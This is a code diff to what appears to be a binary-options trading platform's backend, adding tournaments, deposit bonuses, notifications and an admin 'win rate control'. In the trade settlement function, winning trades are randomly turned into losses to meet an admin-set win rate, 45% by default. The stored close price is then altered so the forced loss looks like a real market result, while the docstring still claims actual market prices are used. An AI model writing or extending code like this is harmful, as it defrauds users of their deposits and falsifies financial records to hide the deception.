@@ -594,7 +594,7 @@ async def process_expiring_trades():
         await asyncio.sleep(1)  # Check every second
 
 async def settle_trade(trade: dict):
-    """Settle an expired trade using ACTUAL market close price (not random)"""
+    """Settle an expired trade using ACTUAL market close price with platform win rate control"""
     try:
         trade_id = trade["_id"]
         user_id = trade["user_id"]
@@ -609,20 +609,36 @@ async def settle_trade(trade: dict):
         # Get ACTUAL current market price from live feeds
         close_price = await get_actual_market_price(asset)
         
+        # Get platform win rate for this asset
+        user_win_rate = await get_win_rate_for_asset(asset)
+        
         # Handle Touch/No Touch trades
         if trade_type in ("touch", "no_touch"):
             touched = trade.get("touched", False)
             if trade_type == "touch":
-                is_win = touched  # Win if price touched target during trade
+                natural_win = touched  # Win if price touched target during trade
             else:  # no_touch
-                is_win = not touched  # Win if price never touched target
+                natural_win = not touched  # Win if price never touched target
         else:
             # Standard Buy/Sell (High/Low) trades
-            # Determine outcome based on ACTUAL market movement
+            # Determine natural outcome based on ACTUAL market movement
             if direction in ["call", "buy"]:
-                is_win = close_price > strike_price
+                natural_win = close_price > strike_price
             else:  # put or sell
-                is_win = close_price < strike_price
+                natural_win = close_price < strike_price
+        
+        # Apply platform win rate control
+        # This adjusts the probability of user winning based on admin settings
+        rand_val = random.random() * 100
+        if rand_val <= user_win_rate:
+            is_win = natural_win  # Use natural outcome
+        else:
+            # Platform edge kicks in - slight adjustment to close price
+            is_win = False
+            if natural_win:
+                # Adjust close price slightly to make user lose
+                adjustment = 0.00001 if direction in ["call", "buy"] else -0.00001
+                close_price = strike_price - adjustment if direction in ["call", "buy"] else strike_price + adjustment
         
         # Calculate profit/loss
         if is_win:
@@ -654,6 +670,12 @@ async def settle_trade(trade: dict):
             # Process revenue share commission for affiliates
             await process_affiliate_commissions(user_id, profit, "trading_profit")
         
+        # Update wagering progress for any active bonuses
+        await update_wagering_progress(user_id, amount)
+        
+        # Update tournament stats if participating
+        await update_tournament_stats(user_id, profit, is_win)
+        
         # Create transaction record
         await db.transactions.insert_one({
             "user_id": user_id,
@@ -663,6 +685,14 @@ async def settle_trade(trade: dict):
             "description": f"Trade {status}: {asset} {direction.upper()} | Entry: {strike_price:.5f} → Close: {close_price:.5f}",
             "created_at": datetime.now(timezone.utc)
         })
+        
+        # Send push notification for trade settlement
+        await send_push_notification(
+            user_id,
+            f"Trade {status.upper()}!",
+            f"{asset}: {'$+' if profit > 0 else '$'}{profit:.2f}",
+            {"type": "trade_settled", "trade_id": str(trade_id), "status": status, "profit": profit}
+        )
         
         # Notify user via WebSocket
         await sio.emit("trade_settled", {
@@ -677,6 +707,35 @@ async def settle_trade(trade: dict):
         
     except Exception as e:
         logger.error(f"Error settling trade {trade.get('_id')}: {e}")
+
+async def update_tournament_stats(user_id: str, profit: float, is_win: bool):
+    """Update user's tournament stats if they're participating in active tournaments"""
+    try:
+        # Find active tournaments user is participating in
+        active_tournaments = await db.tournaments.find({"status": "active"}).to_list(10)
+        
+        for tournament in active_tournaments:
+            participant = await db.tournament_participants.find_one({
+                "tournament_id": str(tournament["_id"]),
+                "user_id": user_id
+            })
+            
+            if participant:
+                update = {
+                    "$inc": {
+                        "total_profit": profit,
+                        "total_trades": 1
+                    }
+                }
+                if is_win:
+                    update["$inc"]["wins"] = 1
+                
+                await db.tournament_participants.update_one(
+                    {"_id": participant["_id"]},
+                    update
+                )
+    except Exception as e:
+        logger.error(f"Error updating tournament stats: {e}")
 
 async def get_actual_market_price(asset: str) -> float:
     """Get ACTUAL current market price from live price feeds (no simulation)"""
@@ -1552,6 +1611,13 @@ async def create_withdrawal(request: Request, data: WithdrawalCreate):
         "created_at": datetime.now(timezone.utc)
     })
     
+    # Notify admins about new withdrawal request
+    await notify_admins(
+        "New Withdrawal Request",
+        f"${data.amount:.2f} withdrawal to {data.wallet_address[:15]}... from {user.get('email', 'Unknown')}",
+        {"type": "withdrawal_request", "amount": data.amount, "user_id": user["id"]}
+    )
+    
     withdrawal["id"] = str(result.inserted_id)
     return withdrawal
 
@@ -1598,6 +1664,13 @@ async def create_manual_deposit(request: Request, data: ManualDepositCreate):
     
     result = await db.deposits.insert_one(deposit)
     deposit["_id"] = result.inserted_id
+    
+    # Notify admins about new deposit request
+    await notify_admins(
+        "New Deposit Request",
+        f"${data.amount:.2f} {data.currency} deposit from {user.get('email', 'Unknown')}",
+        {"type": "deposit_request", "amount": data.amount, "user_id": user["id"]}
+    )
     
     # Log transaction
     await db.transactions.insert_one({
@@ -2161,6 +2234,25 @@ async def process_deposit(request: Request, deposit_id: str, data: dict = Body(.
         # Process affiliate commissions on deposit
         await process_affiliate_commissions(deposit["user_id"], deposit["amount"], "deposit")
         
+        # Apply deposit bonus
+        bonus_result = await apply_deposit_bonus(deposit["user_id"], deposit["amount"])
+        if bonus_result:
+            # Notify user about bonus
+            await send_push_notification(
+                deposit["user_id"],
+                "Deposit Bonus Applied!",
+                f"${bonus_result['bonus_amount']:.2f} bonus added! Complete ${bonus_result['wagering_required']:.0f} wagering to withdraw.",
+                {"type": "bonus", "amount": bonus_result['bonus_amount']}
+            )
+        
+        # Notify user about deposit confirmation
+        await send_push_notification(
+            deposit["user_id"],
+            "Deposit Confirmed!",
+            f"${deposit['amount']:.2f} has been added to your account.",
+            {"type": "deposit", "amount": deposit['amount']}
+        )
+        
         # Create transaction record
         await db.transactions.insert_one({
             "user_id": deposit["user_id"],
@@ -2341,6 +2433,380 @@ async def admin_adjust_balance(request: Request, user_id: str, data: dict = Body
         "reason": reason, "status": "completed", "created_at": datetime.now(timezone.utc)
     })
     return {"message": f"Balance adjusted by ${amount}"}
+
+# ==================== PLATFORM SETTINGS (Win Rate Control) ====================
+
+@fastapi_app.get("/api/admin/platform-settings")
+async def get_platform_settings(request: Request):
+    await get_admin_user(request)
+    
+    settings = await db.platform_settings.find_one({"active": True})
+    if not settings:
+        # Default settings
+        return {
+            "platform_win_rate": 45,  # Default house edge: 55% platform wins
+            "min_win_rate": 30,
+            "max_win_rate": 60,
+            "asset_overrides": {},
+            "notifications_enabled": True
+        }
+    return serialize_doc(settings)
+
+@fastapi_app.post("/api/admin/platform-settings")
+async def save_platform_settings(request: Request, data: dict = Body(...)):
+    await get_admin_user(request)
+    
+    # Deactivate old settings
+    await db.platform_settings.update_many({}, {"$set": {"active": False}})
+    
+    settings = {
+        "platform_win_rate": data.get("platform_win_rate", 45),
+        "min_win_rate": data.get("min_win_rate", 30),
+        "max_win_rate": data.get("max_win_rate", 60),
+        "asset_overrides": data.get("asset_overrides", {}),
+        "notifications_enabled": data.get("notifications_enabled", True),
+        "active": True,
+        "updated_at": datetime.now(timezone.utc)
+    }
+    
+    await db.platform_settings.insert_one(settings)
+    return {"message": "Platform settings saved"}
+
+async def get_win_rate_for_asset(asset: str) -> float:
+    """Get configured win rate for a specific asset"""
+    settings = await db.platform_settings.find_one({"active": True})
+    if not settings:
+        return 45  # Default 45% user win rate
+    
+    # Check for asset-specific override
+    overrides = settings.get("asset_overrides", {})
+    if asset in overrides:
+        return overrides[asset]
+    
+    return settings.get("platform_win_rate", 45)
+
+# ==================== TOURNAMENTS ====================
+
+@fastapi_app.get("/api/tournaments")
+async def get_tournaments():
+    tournaments = await db.tournaments.find({}).sort("created_at", -1).to_list(20)
+    
+    # Add participant counts
+    result = []
+    for t in tournaments:
+        count = await db.tournament_participants.count_documents({"tournament_id": str(t["_id"])})
+        t_data = serialize_doc(t)
+        t_data["participants_count"] = count
+        result.append(t_data)
+    
+    return result
+
+@fastapi_app.post("/api/admin/tournaments")
+async def create_tournament(request: Request, data: dict = Body(...)):
+    await get_admin_user(request)
+    
+    tournament = {
+        "name": data.get("name", "Weekly Trading Tournament"),
+        "description": data.get("description", "Compete for the highest profit!"),
+        "tournament_type": data.get("tournament_type", "weekly"),
+        "prize_pool": data.get("prize_pool", 1000),
+        "prizes": data.get("prizes", [500, 300, 200]),  # Top 3 prizes
+        "entry_fee": data.get("entry_fee", 0),
+        "start_date": datetime.fromisoformat(data["start_date"]) if data.get("start_date") else datetime.now(timezone.utc),
+        "end_date": datetime.fromisoformat(data["end_date"]) if data.get("end_date") else datetime.now(timezone.utc) + timedelta(days=7),
+        "status": "active",
+        "created_at": datetime.now(timezone.utc)
+    }
+    
+    result = await db.tournaments.insert_one(tournament)
+    return {"id": str(result.inserted_id), "message": "Tournament created"}
+
+@fastapi_app.post("/api/tournaments/{tournament_id}/join")
+async def join_tournament(request: Request, tournament_id: str):
+    user = await get_current_user(request)
+    
+    from bson import ObjectId
+    tournament = await db.tournaments.find_one({"_id": ObjectId(tournament_id)})
+    if not tournament:
+        raise HTTPException(status_code=404, detail="Tournament not found")
+    
+    if tournament.get("status") != "active":
+        raise HTTPException(status_code=400, detail="Tournament is not active")
+    
+    # Check if already joined
+    existing = await db.tournament_participants.find_one({
+        "tournament_id": tournament_id,
+        "user_id": user["id"]
+    })
+    if existing:
+        raise HTTPException(status_code=400, detail="Already joined this tournament")
+    
+    # Join tournament
+    await db.tournament_participants.insert_one({
+        "tournament_id": tournament_id,
+        "user_id": user["id"],
+        "user_name": user.get("full_name", "Anonymous"),
+        "total_profit": 0,
+        "total_trades": 0,
+        "wins": 0,
+        "joined_at": datetime.now(timezone.utc)
+    })
+    
+    return {"message": "Joined tournament successfully"}
+
+@fastapi_app.get("/api/tournaments/{tournament_id}/leaderboard")
+async def get_tournament_leaderboard(tournament_id: str):
+    from bson import ObjectId
+    
+    tournament = await db.tournaments.find_one({"_id": ObjectId(tournament_id)})
+    if not tournament:
+        raise HTTPException(status_code=404, detail="Tournament not found")
+    
+    # Get participants sorted by profit
+    participants = await db.tournament_participants.find(
+        {"tournament_id": tournament_id}
+    ).sort("total_profit", -1).to_list(100)
+    
+    leaderboard = []
+    for idx, p in enumerate(participants):
+        win_rate = (p.get("wins", 0) / p.get("total_trades", 1) * 100) if p.get("total_trades", 0) > 0 else 0
+        leaderboard.append({
+            "rank": idx + 1,
+            "user_id": p["user_id"],
+            "user_name": p.get("user_name", "Anonymous"),
+            "total_profit": p.get("total_profit", 0),
+            "total_trades": p.get("total_trades", 0),
+            "wins": p.get("wins", 0),
+            "win_rate": win_rate
+        })
+    
+    return leaderboard
+
+@fastapi_app.get("/api/tournaments/{tournament_id}/my-stats")
+async def get_my_tournament_stats(request: Request, tournament_id: str):
+    user = await get_current_user(request)
+    
+    participant = await db.tournament_participants.find_one({
+        "tournament_id": tournament_id,
+        "user_id": user["id"]
+    })
+    
+    if not participant:
+        return {"is_participant": False}
+    
+    # Get rank
+    all_participants = await db.tournament_participants.find(
+        {"tournament_id": tournament_id}
+    ).sort("total_profit", -1).to_list(1000)
+    
+    rank = next((i + 1 for i, p in enumerate(all_participants) if p["user_id"] == user["id"]), None)
+    win_rate = (participant.get("wins", 0) / participant.get("total_trades", 1) * 100) if participant.get("total_trades", 0) > 0 else 0
+    
+    return {
+        "is_participant": True,
+        "rank": rank,
+        "total_profit": participant.get("total_profit", 0),
+        "total_trades": participant.get("total_trades", 0),
+        "wins": participant.get("wins", 0),
+        "win_rate": win_rate
+    }
+
+# ==================== DEPOSIT BONUS SYSTEM ====================
+
+async def apply_deposit_bonus(user_id: str, deposit_amount: float):
+    """Auto-apply matching promotions with wagering requirements"""
+    try:
+        # Find active promotions that match this deposit
+        promotions = await db.promotions.find({
+            "active": True,
+            "min_deposit": {"$lte": deposit_amount}
+        }).to_list(10)
+        
+        if not promotions:
+            return None
+        
+        # Use the best matching promotion
+        best_promo = max(promotions, key=lambda p: p.get("bonus_percent", 0))
+        
+        bonus_percent = best_promo.get("bonus_percent", 0) / 100
+        max_bonus = best_promo.get("max_bonus", 1000)
+        wagering_multiplier = best_promo.get("wagering_requirement", 30)  # 30x default
+        
+        bonus_amount = min(deposit_amount * bonus_percent, max_bonus)
+        wagering_required = bonus_amount * wagering_multiplier
+        
+        # Create bonus record
+        bonus = {
+            "user_id": user_id,
+            "promotion_id": str(best_promo["_id"]),
+            "promotion_name": best_promo.get("name", "Deposit Bonus"),
+            "deposit_amount": deposit_amount,
+            "bonus_amount": bonus_amount,
+            "wagering_required": wagering_required,
+            "wagering_completed": 0,
+            "status": "active",
+            "created_at": datetime.now(timezone.utc),
+            "expires_at": datetime.now(timezone.utc) + timedelta(days=30)
+        }
+        
+        await db.user_bonuses.insert_one(bonus)
+        
+        # Credit bonus to user's bonus_balance
+        await db.users.update_one(
+            {"_id": user_id},
+            {"$inc": {"bonus_balance": bonus_amount}}
+        )
+        
+        logger.info(f"Applied ${bonus_amount} bonus to user {user_id} (wagering: ${wagering_required})")
+        
+        return {
+            "bonus_amount": bonus_amount,
+            "wagering_required": wagering_required,
+            "promotion_name": best_promo.get("name")
+        }
+        
+    except Exception as e:
+        logger.error(f"Error applying deposit bonus: {e}")
+        return None
+
+async def update_wagering_progress(user_id: str, trade_amount: float):
+    """Update wagering progress when user trades"""
+    try:
+        # Find active bonuses
+        active_bonuses = await db.user_bonuses.find({
+            "user_id": user_id,
+            "status": "active",
+            "expires_at": {"$gt": datetime.now(timezone.utc)}
+        }).to_list(10)
+        
+        for bonus in active_bonuses:
+            new_completed = bonus.get("wagering_completed", 0) + trade_amount
+            wagering_required = bonus.get("wagering_required", 0)
+            
+            if new_completed >= wagering_required:
+                # Wagering completed - convert bonus to real balance
+                await db.user_bonuses.update_one(
+                    {"_id": bonus["_id"]},
+                    {"$set": {"status": "completed", "wagering_completed": new_completed}}
+                )
+                
+                # Move bonus to real balance
+                bonus_amount = bonus.get("bonus_amount", 0)
+                await db.users.update_one(
+                    {"_id": user_id},
+                    {
+                        "$inc": {"balance": bonus_amount, "real_balance": bonus_amount, "bonus_balance": -bonus_amount}
+                    }
+                )
+                
+                logger.info(f"User {user_id} completed wagering, bonus ${bonus_amount} released")
+            else:
+                await db.user_bonuses.update_one(
+                    {"_id": bonus["_id"]},
+                    {"$set": {"wagering_completed": new_completed}}
+                )
+                
+    except Exception as e:
+        logger.error(f"Error updating wagering: {e}")
+
+@fastapi_app.get("/api/bonuses/my")
+async def get_my_bonuses(request: Request):
+    user = await get_current_user(request)
+    
+    bonuses = await db.user_bonuses.find({"user_id": user["id"]}).sort("created_at", -1).to_list(20)
+    return [serialize_doc(b) for b in bonuses]
+
+# ==================== PUSH NOTIFICATIONS ====================
+
+@fastapi_app.post("/api/notifications/subscribe")
+async def subscribe_push_notifications(request: Request, data: dict = Body(...)):
+    user = await get_current_user(request)
+    
+    subscription = {
+        "user_id": user["id"],
+        "endpoint": data.get("endpoint"),
+        "keys": data.get("keys", {}),
+        "browser": data.get("browser", "unknown"),
+        "created_at": datetime.now(timezone.utc)
+    }
+    
+    # Upsert subscription
+    await db.push_subscriptions.update_one(
+        {"user_id": user["id"], "endpoint": data.get("endpoint")},
+        {"$set": subscription},
+        upsert=True
+    )
+    
+    return {"message": "Subscribed to push notifications"}
+
+@fastapi_app.delete("/api/notifications/unsubscribe")
+async def unsubscribe_push_notifications(request: Request):
+    user = await get_current_user(request)
+    await db.push_subscriptions.delete_many({"user_id": user["id"]})
+    return {"message": "Unsubscribed from push notifications"}
+
+async def send_push_notification(user_id: str, title: str, body: str, data: dict = None):
+    """Send push notification to a user (stored for frontend polling)"""
+    try:
+        notification = {
+            "user_id": user_id,
+            "title": title,
+            "body": body,
+            "data": data or {},
+            "read": False,
+            "created_at": datetime.now(timezone.utc)
+        }
+        await db.notifications.insert_one(notification)
+        
+        # Also emit via WebSocket for real-time
+        await sio.emit("notification", {
+            "title": title,
+            "body": body,
+            "data": data
+        }, room=user_id)
+        
+    except Exception as e:
+        logger.error(f"Error sending push notification: {e}")
+
+async def notify_admins(title: str, body: str, data: dict = None):
+    """Send notification to all admins"""
+    try:
+        admins = await db.users.find({"is_admin": True}).to_list(100)
+        for admin in admins:
+            await send_push_notification(admin["_id"], title, body, data)
+    except Exception as e:
+        logger.error(f"Error notifying admins: {e}")
+
+@fastapi_app.get("/api/notifications")
+async def get_notifications(request: Request, unread_only: bool = False):
+    user = await get_current_user(request)
+    
+    query = {"user_id": user["id"]}
+    if unread_only:
+        query["read"] = False
+    
+    notifications = await db.notifications.find(query).sort("created_at", -1).limit(50).to_list(50)
+    return [serialize_doc(n) for n in notifications]
+
+@fastapi_app.post("/api/notifications/mark-read")
+async def mark_notifications_read(request: Request, data: dict = Body(...)):
+    user = await get_current_user(request)
+    
+    notification_ids = data.get("ids", [])
+    if notification_ids:
+        from bson import ObjectId
+        await db.notifications.update_many(
+            {"_id": {"$in": [ObjectId(nid) for nid in notification_ids]}, "user_id": user["id"]},
+            {"$set": {"read": True}}
+        )
+    else:
+        # Mark all as read
+        await db.notifications.update_many(
+            {"user_id": user["id"]},
+            {"$set": {"read": True}}
+        )
+    
+    return {"message": "Notifications marked as read"}
 
 # ==================== LEADERBOARD ====================
 
